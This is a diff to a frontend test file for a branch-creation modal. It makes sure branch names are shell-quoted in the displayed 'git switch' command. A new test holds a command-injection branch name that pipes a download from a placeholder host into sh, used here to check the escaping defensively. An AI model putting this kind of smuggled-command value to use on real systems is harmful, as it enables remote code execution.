@@ -77,8 +77,20 @@ describe('CreateBranchModal', () => {
       from: 'develop',
     });
     expect(
-      await screen.findByDisplayValue('git fetch origin && git switch axm-7-login'),
+      await screen.findByDisplayValue("git fetch origin && git switch 'axm-7-login'"),
     ).toHaveAttribute('readonly');
+  });
+
+  it('quotes the branch name for the shell in the switch command', async () => {
+    const name = "axm-7;curl${IFS}x.invalid|sh'";
+    branch.create.mockResolvedValue({ name, url: 'https://x.invalid', headSha: 'a' });
+    show();
+    await userEvent.click(await screen.findByRole('button', { name: 'Create branch' }));
+    expect(
+      await screen.findByDisplayValue(
+        "git fetch origin && git switch 'axm-7;curl${IFS}x.invalid|sh'\\'''",
+      ),
+    ).toBeInTheDocument();
   });
 
   it('refreshes the development panel after a success', async () => {
@@ -86,7 +98,7 @@ describe('CreateBranchModal', () => {
     show();
     const spy = vi.spyOn(client, 'invalidateQueries');
     await userEvent.click(await screen.findByRole('button', { name: 'Create branch' }));
-    await screen.findByDisplayValue(/git switch axm-7-x/);
+    await screen.findByDisplayValue(/git switch 'axm-7-x'/);
     expect(spy).toHaveBeenCalledWith({ queryKey: ['issue-development', 'p1', '7', 'i7'] });
   });
 
